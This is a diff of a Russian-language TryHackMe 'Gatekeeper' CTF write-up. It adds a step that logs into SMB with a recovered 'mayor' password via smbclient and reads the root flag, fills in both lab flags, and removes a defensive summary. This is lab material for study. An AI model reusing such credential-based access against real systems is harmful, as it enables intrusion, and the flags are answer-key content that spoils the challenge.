@@ -985,27 +985,43 @@ Username: 'mayor'
 Password: '8CL7O1N78MdrCIsV'
 ```
 
+Пробую подключиться к `SMB` с полученными учетными данными и читаю флаг `root`
+```bash
+┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Gatekeeper/exploits]
+└─$ smbclient \\\\$ip\\Users -U mayor%8CL7O1N78MdrCIsV
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                  DR        0  Thu May 14 21:57:08 2020
+  ..                                 DR        0  Thu May 14 21:57:08 2020
+  All Users                       DHSrn        0  Tue Jul 14 01:08:56 2009
+  Default                           DHR        0  Tue Jul 14 03:07:31 2009
+  Default User                    DHSrn        0  Tue Jul 14 01:08:56 2009
+  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
+  mayor                               D        0  Sun Apr 19 11:55:52 2020
+  natbat                              D        0  Thu May 14 21:58:04 2020
+  Public                             DR        0  Thu May 14 21:54:46 2020
+  Share                               D        0  Thu May 14 21:58:07 2020
+
+                7863807 blocks of size 4096. 3962973 blocks available
+smb: \> cd mayor
+smb: \mayor\> dir
+  ...
+
+                7863807 blocks of size 4096. 3962973 blocks available
+smb: \mayor\> cd Desktop
+smb: \mayor\Desktop\> dir
+  .                                  DR        0  Thu May 14 21:58:07 2020
+  ..                                 DR        0  Thu May 14 21:58:07 2020
+  desktop.ini                       AHS      282  Sun Apr 19 11:55:56 2020
+  root.txt.txt                        A       27  Thu May 14 21:21:09 2020
+
+                7863807 blocks of size 4096. 3962973 blocks available
+smb: \mayor\Desktop\> more root.txt.txt
+```
+
 ## 🏁 Флаги
 
 - User flag: {H4lf_W4y_Th3r3} 
-- Root flag: 
+- Root flag: {Th3_M4y0r_C0ngr4tul4t3s_U} 
 
 ---
-
-## 📋 Резюме
-
-🧰 **Инструменты:**
-  - nmap, ffuf, и др.
-
-🚨 **Уязвимости, которые удалось обнаружить:**  
-  - Directory Traversal  
-  - RCE через уязвимый скрипт  
-
-🛡 **Советы по защите:**
-  - Использовать сложные пароли и ограничить число попыток входа
-  - Обновлять ПО до актуальных версий
-  - Удалять/ограничивать использование SUID-бинарников
-  - Настроить логирование и мониторинг системных событий
-  - Применять принцип наименьших привилегий
-
-
